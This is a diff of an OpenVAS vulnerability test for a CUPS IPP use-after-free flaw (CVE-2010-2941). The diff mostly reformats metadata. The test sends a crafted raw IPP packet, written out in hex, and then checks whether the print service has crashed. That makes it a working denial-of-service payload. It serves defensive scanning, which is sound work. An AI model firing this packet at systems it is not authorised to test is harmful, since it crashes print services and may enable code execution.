@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_cupsd_ipp_use_after_free_dos_vuln.nasl 5861 2017-04-05 05:45:17Z teissa $
+# $Id: gb_cupsd_ipp_use_after_free_dos_vuln.nasl 10317 2018-06-25 14:09:46Z cfischer $
 #
 # CUPS IPP Use-After-Free Denial of Service Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:apple:cups";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.800182");
-  script_version("$Revision: 5861 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-05 07:45:17 +0200 (Wed, 05 Apr 2017) $");
+  script_version("$Revision: 10317 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-25 16:09:46 +0200 (Mon, 25 Jun 2018) $");
   script_tag(name:"creation_date", value:"2010-11-18 06:30:08 +0100 (Thu, 18 Nov 2010)");
   script_bugtraq_id(44530);
   script_cve_id("CVE-2010-2941");
@@ -47,27 +47,21 @@ if(description)
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/62882");
   script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=624438");
 
-  tag_impact = "Successful exploitation will let the remote unauthenticated attackers to
+  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers to
   cause a denial of service (use-after-free and application crash) or possibly
   execute arbitrary code via a crafted IPP request.
 
-  Impact Level: Application";
+  Impact Level: Application");
 
-  tag_affected = "CUPS 1.4.4 and prior";
+  script_tag(name:"affected", value:"CUPS 1.4.4 and prior");
 
-  tag_insight = "The flaw is caused by improper allocation of memory for attribute values
-  with invalid string data type.";
+  script_tag(name:"insight", value:"The flaw is caused by improper allocation of memory for attribute values
+  with invalid string data type.");
 
-  tag_solution = "Upgrade to 1.4.5 or above,
-  For updates refer to http://www.cups.org/software.php";
+  script_tag(name:"solution", value:"Upgrade to 1.4.5 or above,
+  For updates refer to http://www.cups.org/software.php");
 
-  tag_summary = "This host is running CUPS and is prone to Denial of Service vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"summary", value:"This host is running CUPS and is prone to Denial of Service vulnerability.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -79,13 +73,10 @@ include("host_details.inc");
 include("http_func.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-
-## Open TCP Socket
-if( ! soc = open_sock_tcp( port ) ) exit( 0 );
-
 host = http_host_name( port:port );
 
-## Construct POST Data Packet
+if( ! soc = open_sock_tcp( port ) ) exit( 0 );
+
 post_data = string( 'POST /ipp/ HTTP/1.1\r\n',
                     'Host: ' + host + '\r\n',
                     'User-Agent: CUPS/1.3.4\r\n',
@@ -94,7 +85,6 @@ post_data = string( 'POST /ipp/ HTTP/1.1\r\n',
                     'Expect: 100-continue\r\n\r\n'
                   );
 
-## Construct Crafted IPP Packet
 raw_data = raw_string( 0x01, 0x01, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x01, 0x01,
                        0x47, 0x00, 0x12, 0x61, 0x74, 0x74, 0x72, 0x69, 0x62,
                        0x75, 0x74, 0x65, 0x73, 0x2d, 0x63, 0x68, 0x61, 0x72,
@@ -130,15 +120,12 @@ raw_data = raw_string( 0x01, 0x01, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x01, 0x01,
                        0x03
                       );
 
-## Send POst data and Crafted IPP packet
 send( socket:soc, data:post_data );
 send( socket:soc, data:raw_data );
 
-## Close the scocket and wait for 5 seconds
 close( soc );
 sleep( 5 );
 
-## Check, Still CUPS service is running
 soc = open_sock_tcp( port );
 if( ! soc ) {
   security_message( port:port );
@@ -146,5 +133,4 @@ if( ! soc ) {
 }
 
 close( soc );
-
 exit( 99 );
